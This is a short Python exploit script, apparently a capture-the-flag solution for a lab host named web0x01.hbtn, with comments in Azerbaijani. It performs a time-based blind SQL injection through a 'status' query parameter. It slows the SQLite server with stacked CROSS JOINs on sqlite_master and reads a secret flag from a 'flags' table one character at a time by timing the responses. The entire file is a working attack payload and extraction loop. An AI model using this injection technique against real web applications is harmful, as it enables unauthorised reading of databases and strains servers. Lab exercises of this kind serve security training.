import requests
import time
import sys

url = "http://web0x01.hbtn/api/a3/sql_injection/all_orders"
flag = ""
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-"

print("[*] Saniyəlik gecikmə ilə flag oxunur... Xahiş edirəm gözləyin...", flush=True)

for i in range(1, 50):
    found = False
    for c in chars:
        # SQLite üçün serveri çökdürməyən təmiz CROSS JOIN gecikməsi
        payload = f"pending' AND (SELECT 1 FROM flags WHERE SUBSTR(flag, {i}, 1) = '{c}' AND (SELECT 1 FROM (SELECT count(*) FROM sqlite_master CROSS JOIN sqlite_master AS t1 CROSS JOIN sqlite_master AS t2 CROSS JOIN sqlite_master AS t3 CROSS JOIN sqlite_master AS t4)))-- -"
        
        start = time.time()
        try:
            requests.get(url, params={"status": payload}, timeout=20)
        except:
            pass
        end = time.time()
        
        # Əgər sorğu 5 saniyədən çox çəkdisə, doğru simvolu tapdıq!
        if (end - start) >= 5:
            flag += c
            sys.stdout.write(c)
            sys.stdout.flush()
            found = True
            if c == "}":
                print(f"\n\n[+] ƏSL FLAG: {flag}")
                sys.exit()
            break
    if not found:
        break
